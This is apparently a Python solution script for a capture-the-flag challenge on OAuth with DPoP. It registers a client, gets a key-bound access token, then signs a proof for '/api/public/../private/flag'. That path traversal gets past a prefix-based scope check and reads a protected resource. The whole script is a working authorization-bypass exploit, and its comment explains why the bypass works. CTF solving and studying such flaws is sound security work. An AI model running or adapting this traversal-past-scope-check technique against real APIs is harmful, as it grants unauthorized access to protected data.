#!/usr/bin/env python3
import base64
import hashlib
import http.client
import json
import time
import uuid

import jwt
from jwt.algorithms import ECAlgorithm
from cryptography.hazmat.primitives.asymmetric import ec

# update this to the actual endpoints
AUTH = "ctf-containers.dev.dataat.rest:30635"
RESOURCE = "ctf-containers.dev.dataat.rest:55764"

key = ec.generate_private_key(ec.SECP256R1())
public_jwk = json.loads(ECAlgorithm.to_jwk(key.public_key()))


def dpop_proof(method, htu, ath=None):
    payload = {"htm": method, "htu": htu, "jti": str(uuid.uuid4()), "iat": int(time.time())}
    if ath:
        payload["ath"] = ath
    return jwt.encode(payload, key, algorithm="ES256",
                      headers={"typ": "dpop+jwt", "jwk": public_jwk})


# 1. register me as lient
c = http.client.HTTPConnection(AUTH)
c.request("POST", "/api/register-client")
client_id = json.loads(c.getresponse().read())["client_id"]
print("client_id:", client_id)

# 2. exchange a DPoP proof for an access token bound to our key
body = f"client_id={client_id}"
c = http.client.HTTPConnection(AUTH)
c.request("POST", "/api/token", body=body, headers={
    "DPoP": dpop_proof("POST", f"http://{AUTH}/api/token"),
    "Content-Type": "application/x-www-form-urlencoded",
})
access_token = json.loads(c.getresponse().read())["access_token"]
print("token:", access_token)

# 3. scope is prefix-checked on the raw htu but resolved on the cleaned path,
#    so /api/public/../private/flag passes the check yet reads the flag.
ath = base64.urlsafe_b64encode(hashlib.sha256(access_token.encode()).digest()).rstrip(b"=").decode()
path = "/api/public/../private/flag"
proof = dpop_proof("GET", f"http://{RESOURCE}{path}", ath)

c = http.client.HTTPConnection(RESOURCE) 
c.request("GET", path, headers={
    "Authorization": f"DPoP {access_token}",
    "DPoP": proof,
})
print("response:", c.getresponse().read().decode())
